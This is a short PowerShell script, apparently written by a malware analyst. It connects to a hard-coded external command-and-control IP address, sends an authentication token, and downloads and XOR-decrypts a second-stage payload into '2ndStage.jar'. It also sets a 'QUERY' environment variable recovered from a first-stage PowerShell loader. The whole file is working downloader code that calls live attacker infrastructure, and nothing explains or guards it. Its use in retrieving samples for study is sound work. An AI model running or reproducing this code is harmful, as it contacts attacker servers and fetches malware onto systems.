$c=New-Object Net.Sockets.TcpClient("80.67.5.133", 443) #update with the active C2 IP/URL
$s=$c.GetStream()
$s.ReadTimeout=10000
$w=New-Object System.IO.StreamWriter $s
$w.WriteLine("TLS v3 c4F5SS_swD4aPjKoLLabBpws4twez1wH2rhwGrSs_1c")
$w.Flush()
$k=50,177,162,213,177,47,14,185,194,75,101,58,18,181,67,158
$a=New-Object System.Byte[] 9999
$f="2ndStage.jar"
$t=New-Object IO.FileStream($f, [IO.FileMode]::Create)
$n=$g=0
while(1){$r=$s.Read($a,0,9999)
if($r -le 0){break}
for($i=0;$i -lt $r;$i++){$j=$n++ -band 15
$a[$i]=$a[$i] -bxor $k[$j] -bxor $g
$g=($g+$a[$i]) -band 255
$k[$j]=($k[$j]+3) -band 255}
$t.Write($a,0,$r)}
$t.Close()
$w.Close()
$s.Close()
$env:QUERY="gYODK48uoXtib1RhdnFoQpHtLmWjt-FaR54iq3hJCEK3BLmqkmMDlUOm5RexJcc0ODAuNjcuNS4xMzM7MTIuMTY4LjIyMS41NV81MDgwOw" #Update with recovered Query variable from 1st stage PowerShell
$env:F=$f

